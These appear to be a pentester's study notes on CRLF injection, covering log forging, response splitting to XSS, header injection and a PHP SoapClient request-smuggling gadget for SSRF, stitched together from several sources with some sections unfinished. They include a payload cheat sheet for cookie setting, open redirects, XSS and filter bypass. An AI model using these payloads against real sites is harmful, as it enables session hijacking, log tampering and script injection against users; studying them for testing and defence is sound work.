# CRLF
## **What is the CRLF combination?**

The HTTP headers and the HTML response (website content) are separated by a specific combination of special characters, namely a carriage return (CR) and a line feed (LF).

The web server uses the CRLF combination to understand when new HTTP header begins and another one ends. The CRLF can also tell a web application or user that a new line begins in a file or in a text block. The CRLF characters are a standard HTTP/1.1 message, so they are used by all web servers, including **[Apache](https://www.invicti.com/server-security-software/apache-security-scanner/)**
, Microsoft IIS, and others.

---

## **What is the CRLF injection vulnerability?**

In a CRLF injection attack, the attacker inserts the carriage return and linefeed characters into user input to trick the server into thinking that an object has terminated and another one has started,, for example for HTTP response splitting.

---

## ****CRLF injection in web applications****

CRLF injection can have a severe impact , can range from information disclosure to code execution

---

### **Example: CRLF injection in a log file**

Imagine a log file in an admin panel with the output stream pattern of *IP - Time - Visited Path,* such as the below:

```
123.123.123.123 - 08:15 - /index.php?page=home
```

If an attacker is able to inject the CRLF characters into the HTTP request, they can change the output stream and fake log entries. The response from the web application can be changed to something like this:

```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```

The `%0d` and `%0a` are URL-encoded forms of CR and LF. Therefore, the log entries would look like this after the attacker inserted those characters and the application displays them (IP - Time - Visited Path):

```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```

By exploiting a CRLF injection vulnerability, attackers can fake entries in the log file to obfuscate their actions. In this case, the attacker is literally doing page hijacking and modifying the response.

Imagine a scenario where the attacker has the admin password and uses the `restrictedaction` parameter, which can only be used by an admin. If an administrator notices that an unknown IP has used the `restrictedaction` parameter, they may suspect malicious activity. However, since now it looks like the command was issued by the localhost (and therefore probably by someone who has access to the server, like an admin), it does not look suspicious.

The whole part of the query beginning with `%0d%0a` will be handled by the server as one parameter. After that, there is another `&` character with the parameter `restrictedaction`, which will be parsed by the server as another parameter. Effectively, this would be the same query as:

```
/index.php?page=home&restrictedaction=edit
```

---

## EX-2

, there are a couple of inputs being reflected into the HTTP Headers . After a bit of fiddling, I discovered that non-printable control characters were not encoded which they should be, which took me to try for CRLF and I tried to add “Location” header to see whether it was 

getting redirected. Below is the POC —

![1_EZMcORKM2QPG_vXC-Fy4pw.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c58282cd-5556-4be5-bb07-5de1754514e0/1_EZMcORKM2QPG_vXC-Fy4pw.png)

Now the Server responds to this request by injecting the CRLF characters in the response , you will find “Location” http header has been set in the http response with the value “[http://www.evilzone.org](http://www.evilzone.org/)” as injected via the CRLF payload in the below screesnshot—

![1_ieQQ71kALe3qFVEKi1aMQA.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cad1c738-97dc-4242-ae93-e4f5ba618ce3/1_ieQQ71kALe3qFVEKi1aMQA.png)

---

## **HTTP response splitting**

. A combination of CRLFCRLF will tell the browser that the header ends and the body begins. This could allow an attacker to write data into the response body where the HTML code is sent, leading to a **[cross-site scripting  (XSS)](https://www.invicti.com/blog/web-security/cross-site-scripting-xss/)**
 vulnerability.

### **Example: HTTP response splitting leading to XSS**

Imagine an application that sets a custom header, for example:

```
X-Your-Name: Bob
```

The value of the header is set via a GET parameter called `name`. If no URL-encoding is in place and the value is directly reflected inside the header, it might be possible for an attacker to insert the above mentioned combination of CRLFCRLF to tell the browser where the request body begins. That way, attackers may be able to insert data such as a XSS payload, for example:

```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```

The above will display an alert window in the context of the attacked domain.

---

## **HTTP header injection**

By exploiting a CRLF injection, an attacker can also insert HTTP headers which could be used to defeat security mechanisms such as a browser's XSS filter or the same-origin-policy. This allows malicious actors to obtain sensitive information like CSRF tokens. Attackers can also set cookies which could be exploited by logging the victim into the attacker's account or used to exploit otherwise unexploitable cross-site scripting vulnerabilities.

---

## How to find

1. using user input directly in response headers.
2. no encode the CRLF special characters.
3. 

---

## New HTTP request in SSRF

Abusing CRLF injection you can **craft a new HTTP request and inject it**.
A good example can be done using the `SoapClient` deserialization gadget from in PHP. This class is **vulnerable to CRLF** inside the `user_agent` parameter allowing to i**nsert new headers and body content**. However, you can even be able to abuse this vulnerability to **inject a new HTTP request:**

```bash
$target = 'http://127.0.0.1:9090/test'; 
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: '.(string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null,
    array(
        'uri'=>$target,
        'location'=>$target,
        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
    )
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```

## CHEATSHEET

```bash
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```

## Tools

https://github.com/dwisiswant0/crlfuzz

https://github.com/dwisiswant0/crlfuzz

**Brute-Force Detection List ⇒[Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)/[wordlists](https://github.com/carlospolop/Auto_Wordlists/tree/main/wordlists)/crlf.txt[Go to file](https://github.com/carlospolop/Auto_Wordlists/find/main)**

[Auto_Wordlists/crlf.txt at main · carlospolop/Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)

###
